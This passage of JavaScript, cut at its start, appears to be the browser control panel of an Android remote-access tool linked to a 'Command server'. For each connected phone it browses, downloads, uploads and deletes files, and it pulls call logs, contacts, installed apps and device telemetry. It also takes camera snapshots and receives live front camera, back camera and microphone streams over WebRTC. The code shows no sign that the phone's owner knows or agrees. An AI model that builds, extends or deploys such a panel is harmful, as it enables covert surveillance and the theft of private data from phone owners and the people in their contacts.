    isVideoStreaming: false,
    pendingChunks: []
  };

  previewProgress.style.display = 'block';
  previewProgress.style.color = 'var(--primary)';
  previewProgress.textContent = 'Requesting file...';

  socket.emit('fs:preview_request', {
    to: selectedDeviceId,
    path: path,
    requestId: requestId
  });

  logDebug(`[PREVIEW] Requested: ${fileName}`);
}

function openPreviewModal(fileName) {
  previewTitle.textContent = fileName || 'Preview';
  previewContent.innerHTML = '';
  previewModal.classList.add('active');
}

function closePreview() {
  if (currentPreview && selectedDeviceId) {
    socket.emit('fs:preview_cancel', {
      to: selectedDeviceId,
      requestId: currentPreview.requestId
    });
  }

  previewModal.classList.remove('active');
  previewContent.innerHTML = '';
  previewProgress.style.display = 'none';

  if (currentPreviewBlobUrl) {
    try { URL.revokeObjectURL(currentPreviewBlobUrl); } catch (e) {}
    currentPreviewBlobUrl = null;
  }
  if (currentPreview && currentPreview.blobUrl) {
    try { URL.revokeObjectURL(currentPreview.blobUrl); } catch (e) {}
  }

  currentPreview = null;
}

function handlePreviewMeta(data) {
  if (!currentPreview || data.requestId !== currentPreview.requestId) return;

  currentPreview.name = data.name || currentPreview.name;
  currentPreview.size = data.size || 0;
  currentPreview.type = data.mime || 'application/octet-stream';
  currentPreview.kind = data.kind || '';

  previewTitle.textContent = currentPreview.name;
  previewProgress.textContent = `Loading ${currentPreview.name}... 0%`;
  logDebug(`[PREVIEW] Meta: ${data.name} (${formatBytes(data.size)}, ${data.mime})`);
}

function handlePreviewChunk(data) {
  if (!currentPreview || data.requestId !== currentPreview.requestId) return;

  let bytes;
  try {
    const binary = atob(data.content);
    bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
  } catch (e) {
    console.error('[PREVIEW] Failed to decode chunk:', e);
    return;
  }

  currentPreview.receivedSize += bytes.length;

  if (currentPreview.size > 0) {
    const pct = Math.min(100, Math.floor((currentPreview.receivedSize / currentPreview.size) * 100));
    previewProgress.textContent = `Loading ${currentPreview.name}... ${pct}%`;
  } else {
    previewProgress.textContent = `Loading ${currentPreview.name}... ${formatBytes(currentPreview.receivedSize)}`;
  }

  if (currentPreview.kind === 'image') {
    currentPreview.chunks.push(bytes);
  } else if (currentPreview.kind === 'video') {
    if (currentPreview.sourceBuffer && !currentPreview.sourceBuffer.updating) {
      try { currentPreview.sourceBuffer.appendBuffer(bytes); }
      catch (e) {
        console.warn('[PREVIEW] MSE append failed, buffering:', e);
        currentPreview.pendingChunks.push(bytes);
      }
    } else {
      currentPreview.pendingChunks.push(bytes);
    }
  }
}

function handlePreviewComplete(data) {
  if (!currentPreview || data.requestId !== currentPreview.requestId) return;

  previewProgress.textContent = 'Rendering...';

  if (currentPreview.kind === 'image') {
    renderImagePreview();
  } else if (currentPreview.kind === 'video') {
    if (currentPreview.mediaSource && currentPreview.mediaSource.readyState === 'open') {
      try { currentPreview.mediaSource.endOfStream(); } catch (e) {}
    }
    if (!currentPreview.mediaSource) renderVideoFromBlob();
  } else {
    renderUnknownFromBlob();
  }

  logDebug(`[PREVIEW] Complete: ${currentPreview.name} (${formatBytes(currentPreview.receivedSize)})`);
}

function handlePreviewError(data) {
  if (!currentPreview || data.requestId !== currentPreview.requestId) return;
  previewProgress.style.color = 'var(--danger)';
  previewProgress.textContent = 'Error: ' + (data.message || 'Unknown');
  logDebug('[PREVIEW] Error: ' + data.message);
}

function renderImagePreview() {
  if (!currentPreview) return;
  const total = currentPreview.receivedSize;
  const merged = new Uint8Array(total);
  let offset = 0;
  for (const chunk of currentPreview.chunks) { merged.set(chunk, offset); offset += chunk.length; }
  currentPreview.chunks = [];

  const blob = new Blob([merged], { type: currentPreview.type || 'image/jpeg' });
  currentPreview.blobUrl = URL.createObjectURL(blob);

  previewContent.innerHTML = '';
  previewProgress.style.display = 'none';

  const img = document.createElement('img');
  img.src = currentPreview.blobUrl;
  img.style.cssText = 'max-width: 100%; max-height: 65vh; display: block; margin: auto; border-radius: 8px;';
  previewContent.appendChild(img);

  appendDownloadButton(currentPreview.blobUrl, currentPreview.name);
}

function renderVideoFromBlob() {
  if (!currentPreview) return;
  const pending = currentPreview.pendingChunks;
  currentPreview.pendingChunks = [];

  let total = 0;
  for (const c of pending) total += c.length;
  const merged = new Uint8Array(total);
  let offset = 0;
  for (const c of pending) { merged.set(c, offset); offset += c.length; }

  const blob = new Blob([merged], { type: currentPreview.type || 'video/mp4' });
  currentPreview.blobUrl = URL.createObjectURL(blob);

  previewContent.innerHTML = '';
  previewProgress.style.display = 'none';

  const video = document.createElement('video');
  video.src = currentPreview.blobUrl;
  video.controls = true;
  video.autoplay = true;
  video.style.cssText = 'max-width: 100%; max-height: 65vh; display: block; margin: auto; background: #000; border-radius: 8px;';
  previewContent.appendChild(video);

  appendDownloadButton(currentPreview.blobUrl, currentPreview.name);
}

function renderUnknownFromBlob() {
  if (!currentPreview) return;
  previewContent.innerHTML = '';
  previewProgress.style.display = 'block';
  previewProgress.style.color = 'var(--warning)';
  previewProgress.textContent = 'Preview not available for this file type';
  appendDownloadButton(null, currentPreview.name);
}

function appendDownloadButton(blobUrl, fileName) {
  const dlBtn = document.createElement('button');
  dlBtn.textContent = '💾 Download Full Size';
  dlBtn.className = 'btn-explorer btn-primary';
  dlBtn.style.cssText = 'margin-top: 16px; padding: 8px 20px;';

  if (blobUrl) {
    dlBtn.onclick = () => {
      const a = document.createElement('a');
      a.href = blobUrl;
      a.download = fileName;
      a.click();
    };
  } else {
    dlBtn.onclick = () => { requestFileDownload(currentPreview.path); };
  }

  previewContent.appendChild(dlBtn);
}

if (previewCloseBtn) previewCloseBtn.addEventListener('click', closePreview);
if (previewModal) {
  previewModal.addEventListener('click', (e) => { if (e.target.id === 'previewModal') closePreview(); });
}
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && previewModal.classList.contains('active')) closePreview();
});

// ─────────────────────────────────────────────────────────────
// File Explorer
// ─────────────────────────────────────────────────────────────

let currentPath = "/storage/emulated/0/";

function applySort(files) {
  if (!files || files.length === 0) return files;
  const sorted = [...files];

  const compareFn = (a, b) => {
    switch (currentSortMode) {
      case 'name-asc':  return a.name.localeCompare(b.name);
      case 'name-desc': return b.name.localeCompare(a.name);
      case 'date-asc':  return (a.modified || 0) - (b.modified || 0);
      case 'date-desc': return (b.modified || 0) - (a.modified || 0);
      case 'size-asc':  return (a.size || 0) - (b.size || 0);
      case 'size-desc': return (b.size || 0) - (a.size || 0);
      default:          return a.name.localeCompare(b.name);
    }
  };

  sorted.sort((a, b) => {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return compareFn(a, b);
  });

  return sorted;
}

if (fsSortSelect) {
  fsSortSelect.addEventListener('change', (e) => {
    currentSortMode = e.target.value;
    logDebug(`[FS] Sort changed to: ${currentSortMode}`);
    if (currentFilesCache.length > 0) renderFileList(currentFilesCache, currentFilesPath);
  });
}

function requestFileList(path) {
  if (!selectedDeviceId) {
    updateStatus('No device selected');
    return;
  }
  updateStatus(`Requesting files: ${path}`);
  socket.emit('fs:list', { to: selectedDeviceId, path: path });
}

function getKindIcon(kind) {
  switch (kind) {
    case 'folder': return '📁';
    case 'image': return '🖼️';
    case 'video': return '🎬';
    case 'audio': return '🎵';
    case 'document': return '📄';
    case 'archive': return '📦';
    case 'text': return '📝';
    default: return '📄';
  }
}

function renderFileList(files, path) {
  if (path) {
    currentPath = path;
    fsPathInput.value = path;
  }
  fileListDiv.innerHTML = '';

  if (!files || files.length === 0) {
    fileListDiv.innerHTML = '<div style="color: var(--text-muted); padding: 14px; font-size: 0.85rem;">This directory is empty.</div>';
    return;
  }

  const sortedFiles = applySort(files);
  const itemsToObserve = [];

  sortedFiles.forEach(file => {
    const item = document.createElement('div');
    item.className = 'file-item';

    const icon = document.createElement('span');
    icon.className = 'file-icon';
    icon.textContent = file.isDir ? '📁' : getKindIcon(file.kind || 'file');
    item.appendChild(icon);

    if (!file.isDir && (file.kind === 'image' || file.kind === 'video')) {
      item.dataset.thumbPath = file.path;
      item.dataset.thumbKind = file.kind;
      itemsToObserve.push(item);
    }

    const info = document.createElement('div');
    info.className = 'file-info';

    const name = document.createElement('div');
    name.className = 'file-name';
    name.textContent = file.name;
    if (file.isDir) name.style.color = 'var(--primary)';

    const size = document.createElement('div');
    size.className = 'file-size';
    size.textContent = file.isDir ? 'Folder' : formatBytes(file.size);

    info.appendChild(name);
    info.appendChild(size);
    item.appendChild(info);

    const actions = document.createElement('div');
    actions.className = 'file-actions';

    if (!file.isDir && isPreviewableKind(file.kind)) {
      const previewBtn = document.createElement('button');
      previewBtn.className = 'btn-file-action preview';
      previewBtn.title = 'Preview';
      previewBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"/><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>`;
      previewBtn.onclick = (e) => { e.stopPropagation(); requestFilePreview(file.path); };
      actions.appendChild(previewBtn);
    }

    if (!file.isDir) {
      const downloadBtn = document.createElement('button');
      downloadBtn.className = 'btn-file-action download';
      downloadBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>`;
      downloadBtn.onclick = (e) => { e.stopPropagation(); requestFileDownload(file.path); };
      actions.appendChild(downloadBtn);
    }

    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'btn-file-action delete';
    deleteBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>`;
    deleteBtn.onclick = (e) => {
      e.stopPropagation();
      if (confirm(`Permanently delete ${file.name}?`)) deleteFile(file.path);
    };
    actions.appendChild(deleteBtn);

    item.appendChild(actions);

    if (file.isDir) item.onclick = () => requestFileList(file.path);

    fileListDiv.appendChild(item);
  });

  setupLazyThumbnails(itemsToObserve);
}

function formatBytes(bytes) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function requestFileDownload(path) {
  updateStatus(`Starting download: ${path}`);
  if (selectedDeviceId) socket.emit('fs:download', { to: selectedDeviceId, path: path });
}

function deleteFile(path) {
  updateStatus(`Requesting deletion: ${path}`);
  if (selectedDeviceId) socket.emit('fs:delete', { to: selectedDeviceId, path: path });
}

fsGoBtn.addEventListener('click', () => requestFileList(fsPathInput.value));

fsBackBtn.addEventListener('click', () => {
  let path = currentPath;
  if (path.endsWith('/')) path = path.slice(0, -1);
  if (path === '') path = '/';
  const lastSlash = path.lastIndexOf('/');
  if (lastSlash !== -1) {
    const parent = path.substring(0, lastSlash + 1) || '/';
    requestFileList(parent);
  } else {
    requestFileList('/');
  }
});

fsUploadArea.addEventListener('click', () => fsUploadInput.click());

fsUploadInput.addEventListener('change', (e) => {
  if (e.target.files.length > 0) uploadTargetFile(e.target.files[0]);
});

fsUploadArea.addEventListener('dragover', (e) => {
  e.preventDefault();
  fsUploadArea.style.borderColor = 'var(--primary)';
  fsUploadArea.style.background = 'rgba(0, 240, 255, 0.04)';
});

['dragleave', 'dragend', 'drop'].forEach(evt => {
  fsUploadArea.addEventListener(evt, () => {
    fsUploadArea.style.borderColor = 'rgba(255,255,255,0.08)';
    fsUploadArea.style.background = 'rgba(0,0,0,0.15)';
  });
});

fsUploadArea.addEventListener('drop', (e) => {
  e.preventDefault();
  if (e.dataTransfer.files.length > 0) uploadTargetFile(e.dataTransfer.files[0]);
});

function uploadTargetFile(file) {
  if (!selectedDeviceId) {
    logDebug('Cannot upload file, no device selected');
    return;
  }

  logDebug(`[FS] Initiating chunked uploader: ${file.name} (${formatBytes(file.size)})`);
  fsUploadLabel.textContent = `Uploading ${file.name}... (0%)`;
  fsUploadProgress.style.width = '0%';

  const targetDevice = selectedDeviceId;

  const reader = new FileReader();
  reader.onload = async (event) => {
    const rawBuffer = event.target.result;
    const chunkSize = 64 * 1024;
    const totalChunks = Math.ceil(rawBuffer.byteLength / chunkSize);

    socket.emit('fs:upload_start', {
      to: targetDevice,
      filename: file.name,
      parentPath: currentPath,
      totalChunks: totalChunks
    });

    for (let idx = 0; idx < totalChunks; idx++) {
      const start = idx * chunkSize;
      const end = Math.min(start + chunkSize, rawBuffer.byteLength);
      const slice = rawBuffer.slice(start, end);

      const binary = String.fromCharCode.apply(null, new Uint8Array(slice));
      const base64 = btoa(binary);

      socket.emit('fs:upload_chunk', { to: targetDevice, chunk: base64 });

      const pct = Math.floor(((idx + 1) / totalChunks) * 100);
      fsUploadProgress.style.width = `${pct}%`;
      fsUploadLabel.textContent = `Uploading ${file.name}... (${pct}%)`;

      await new Promise(r => setTimeout(r, 10));
    }

    socket.emit('fs:upload_complete', { to: targetDevice });
    fsUploadLabel.textContent = 'Upload Completed successfully';
    logDebug(`[FS] File upload assembled on device: ${file.name}`);
    setTimeout(() => {
      fsUploadLabel.textContent = 'Drag files here or click to upload to current directory';
      fsUploadProgress.style.width = '0%';
    }, 4000);
  };

  reader.readAsArrayBuffer(file);
}

// ─────────────────────────────────────────────────────────────
// WebSocket event subscriptions
// ─────────────────────────────────────────────────────────────

socket.on('connect', () => updateStatus('Connected to Command server'));
socket.on('connect_error', () => updateStatus('Failed to connect to signaling host'));
socket.on('disconnect', () => updateStatus('Disconnected from Command server'));

socket.on('id', (id) => {
  myId = id;
  logDebug(`Authenticated session ID: ${myId}`);
});

// ── Android client connected ──
socket.on('android-client-ready', (msg) => {
  const id = msg && msg.id ? msg.id : msg;
  if (!id) return;

  devices.set(id, {
    id: id,
    model: (msg && msg.model) || null,
    name: (msg && msg.name) || null,
    deviceId: (msg && msg.deviceId) || null,
    connectedAt: Date.now()
  });

  logDebug(`[DEVICE] Online: ${getDeviceLabel(id)} (${id})`);

  const wasEmpty = devices.size === 1;
  renderDeviceList();

  if (!selectedDeviceId || wasEmpty) {
    selectDevice(id);
  } else {
    updateStatus(`Device online: ${getDeviceLabel(id)}`);
  }
});

// ── Android client disconnected ──
socket.on('android-client-disconnected', (msg) => {
  const id = msg && msg.id ? msg.id : msg;
  if (!id) return;

  const label = getDeviceLabel(id);

  devices.delete(id);
  callLogsByDevice.delete(id);
  contactsByDevice.delete(id);
  appsByDevice.delete(id);
  deviceInfoByDevice.delete(id);

  renderDeviceList();

  logDebug(`[DEVICE] Offline: ${label} (${id})`);

  if (selectedDeviceId === id) {
    selectedDeviceId = null;
    resetUIForNoDevice();

    if (devices.size > 0) {
      const nextId = devices.keys().next().value;
      selectDevice(nextId);
    } else {
      updateStatus('No devices connected');
      renderDeviceList();
    }
  } else {
    updateStatus(`Device offline: ${label}`);
  }
});

// ── Device info (FILTERED + CACHED) ──
socket.on('device_info', (info) => {
  if (!info) return;
  const from = info.from;
  if (!from || from !== selectedDeviceId) return;

  deviceInfoByDevice.set(from, {
    model: info.model,
    manufacturer: info.manufacturer,
    version: info.version,
    battery: info.battery,
    batteryTemp: info.batteryTemp,
    chargingSource: info.chargingSource,
    storageTotal: info.storageTotal,
    storageFree: info.storageFree
  });

  logDebug(`[TELEMETRY] Updated metrics from ${getDeviceLabel(from)}`);
  renderDeviceInfo(from);
});

// ── Call logs (FILTERED + CACHED) ──
socket.on('call_log', (data) => {
  if (!data || !data.call_logs) return;
  const from = data.from;
  if (!from || from !== selectedDeviceId) return;

  callLogsByDevice.set(from, data.call_logs);
  logDebug(`[CALLS] Received ${data.call_logs.length} logs from ${getDeviceLabel(from)}`);
  renderCallLogs(from);
});

// ── Apps list (FILTERED + CACHED) ──
socket.on('apps_list', (data) => {
  if (!data || !data.apps) return;
  const from = data.from;
  if (!from || from !== selectedDeviceId) return;

  appsByDevice.set(from, data.apps);
  logDebug(`[APPS] Received ${data.apps.length} apps from ${getDeviceLabel(from)}`);
  renderApps(from);
});

// ── Contacts list (FILTERED + CACHED + NORMALIZED) ──
socket.on('contacts_list', (data) => {
  if (!data) return;
  const from = data.from;
  if (!from || from !== selectedDeviceId) return;

  const rawList = data.contacts_list || data.contacts || [];
  const normalized = normalizeContacts(rawList);
  contactsByDevice.set(from, normalized);

  logDebug(`[CONTACTS] Received ${rawList.length} entries → ${normalized.length} unique contacts from ${getDeviceLabel(from)}`);
  renderContacts(from);
});

function normalizeContacts(rawList) {
  const byName = new Map();

  for (const c of rawList) {
    const name = ((c && c.name) || 'Unknown').toString().trim() || 'Unknown';

    let numbers = [];
    if (Array.isArray(c.phones)) {
      numbers = c.phones.filter(Boolean).map(n => n.toString().trim());
    } else if (c.number) {
      numbers = [c.number.toString().trim()];
    }

    if (!byName.has(name)) {
      byName.set(name, { name: name, phones: [] });
    }
    const entry = byName.get(name);
    for (const num of numbers) {
      if (num && !entry.phones.includes(num)) {
        entry.phones.push(num);
      }
    }
  }

  return Array.from(byName.values()).sort((a, b) => a.name.localeCompare(b.name));
}

// ── Snapshot (FILTERED) ──
socket.on('snapshot_data', (data) => {
  if (!data || !data.snapshot) return;
  const from = data.from;
  if (!from || from !== selectedDeviceId) return;

  logDebug(`Received camera snapshot from: ${data.snapshot.camera}`);
  currentSnapshotBase64 = data.snapshot.image;
  snapshotPreview.src = `data:image/jpeg;base64,${currentSnapshotBase64}`;
  snapshotModal.classList.add('active');
});

// ── File system responses ──
socket.on('fs:files', (data) => {
  logDebug('Refreshing explorer directory tree');
  if (data && data.file_list) {
    currentFilesCache = data.file_list.files || [];
    currentFilesPath = data.file_list.currentPath || '';
    renderFileList(currentFilesCache, currentFilesPath);
  }
});

socket.on('fs:delete_result', (data) => {
  if (!data) return;
  logDebug(`[FS] Delete operation result: ${data.success ? 'SUCCESS' : 'FAILED'} for path ${data.path}`);
  updateStatus(data.success ? 'Deleted file successfully' : 'Failed to delete target file');
  requestFileList(currentPath);
});

socket.on('fs:thumb_batch', (data) => {
  if (!data || !data.batchId) return;
  const pending = pendingThumbBatches.get(data.batchId);
  if (!pending) return;

  const thumbs = data.thumbs || [];
  thumbs.forEach(t => {
    thumbCache.set(t.path, { kind: t.kind, mime: t.mime, dataUrl: `data:${t.mime};base64,${t.thumb}` });
  });

  logDebug(`[THUMB] Batch ${data.batchId} received (${thumbs.length} thumbs)`);
  pending.resolve();
  pendingThumbBatches.delete(data.batchId);
});

socket.on('fs:preview_meta', (data) => handlePreviewMeta(data));
socket.on('fs:preview_chunk', (data) => handlePreviewChunk(data));
socket.on('fs:preview_complete', (data) => handlePreviewComplete(data));
socket.on('fs:preview_error', (data) => handlePreviewError(data));

socket.on('fs:download_start', (data) => {
  if (!data) return;
  const { fileId, name, size, totalChunks } = data;
  logDebug(`[FS] Starting chunked download: ${name} (${formatBytes(size)})`);
  activeDownloads[fileId] = {
    name: name,
    buffer: new Array(totalChunks),
    totalChunks: totalChunks,
    receivedChunks: 0,
    startTime: Date.now()
  };
  updateStatus(`Downloading ${name} (0%)`);
});

socket.on('fs:download_chunk', (data) => {
  if (!data) return;
  const { fileId, chunkIndex, content } = data;
  const download = activeDownloads[fileId];
  if (download) {
    if (!download.buffer[chunkIndex]) {
      download.buffer[chunkIndex] = content;
      download.receivedChunks++;
    }
    const pct = Math.floor((download.receivedChunks / download.totalChunks) * 100);
    if (pct % 10 === 0) updateStatus(`Downloading ${download.name} (${pct}%)`);
  }
});

socket.on('fs:download_complete', (data) => {
  if (!data) return;
  const { fileId } = data;
  const download = activeDownloads[fileId];
  if (download) {
    logDebug(`[FS] File download assembled: ${download.name}`);
    updateStatus(`Writing stream data...`);
    const base64Complete = download.buffer.join('');
    downloadBase64File(base64Complete, download.name);
    const duration = ((Date.now() - download.startTime) / 1000).toFixed(1);
    updateStatus(`Completed ${download.name} in ${duration}s`);
    delete activeDownloads[fileId];
  }
});

socket.on('fs:download_error', (data) => {
  if (!data) return;
  const { fileId, error } = data;
  if (activeDownloads[fileId]) {
    updateStatus(`Download error: ${activeDownloads[fileId].name}`);
    delete activeDownloads[fileId];
  }
  logDebug(`[FS] Download fail: ${error}`);
});

function downloadBase64File(base64Data, fileName) {
  const linkSource = `data:application/octet-stream;base64,${base64Data}`;
  const downloadLink = document.createElement("a");
  downloadLink.href = linkSource;
  downloadLink.download = fileName;
  downloadLink.click();
}

// ─────────────────────────────────────────────────────────────
// WebRTC Signaling — ONLY accept signals from selected device
// ─────────────────────────────────────────────────────────────

socket.on('signal', async (data) => {
  if (!data) return;
  const { from, signal } = data;

  if (!selectedDeviceId || from !== selectedDeviceId) {
    logDebug(`[WEBRTC] Ignoring signal from non-selected device: ${from}`);
    return;
  }

  if (!peer) {
    logDebug('Initializing WebRTC RTCPeerConnection');
    try {
      peer = new RTCPeerConnection(rtcConfig);
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('audio', { direction: 'recvonly' });

      peer.ontrack = (event) => {
        const track = event.track;
        const mid = event.transceiver ? event.transceiver.mid : null;
        console.log('Track received:', track.kind, track.id, 'mid:', mid);

        if (track.kind === 'audio') {
          audioTrack = track;
        } else if (track.kind === 'video') {
          if (track.id === 'front_video' || track.id === 'front_camera') frontVideoTrack = track;
          else if (track.id === 'back_video' || track.id === 'back_camera') backVideoTrack = track;
          else {
            if (mid === '0' && !frontVideoTrack) frontVideoTrack = track;
            else if (mid === '1' && !backVideoTrack) backVideoTrack = track;
          }
        }
        updateStreams();
      };

      peer.onicecandidate = e => {
        if (e.candidate) {
          socket.emit('signal', {
            to: from,
            from: myId,
            signal: { candidate: e.candidate }
          });
        }
      };

      peer.oniceconnectionstatechange = () => {
        updateStatus(`WebRTC: ${peer.iceConnectionState}`);
        if (peer.iceConnectionState === 'failed') updateStatus('Connection failed. Refresh or retry.');
      };

    } catch (err) {
      console.error('Failed to create peer connection:', err);
    }
  }

  try {
    if (signal && signal.type === 'offer') {
      await peer.setRemoteDescription(new RTCSessionDescription(signal));
      const answer = await peer.createAnswer();
      await peer.setLocalDescription(answer);
      socket.emit('signal', {
        to: from,
        from: myId,
        signal: { type: 'answer', sdp: answer.sdp }
      });
    } else if (signal && signal.candidate) {
      await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
    }
  } catch (err) {
    console.error('Signal parsing error:', err);
  }
});

socket.on('error', (error) => {
  if (error && error.message) updateStatus(`Signal Error: ${error.message}`);
});

retryButton.addEventListener('click', reconnectSocket);

// ─────────────────────────────────────────────────────────────
// Initialize
// ─────────────────────────────────────────────────────────────

updateStatus('Connecting to signaling...');
switchTab(tabCalls, paneCalls);
renderDeviceList();
resetUIForNoDevice();
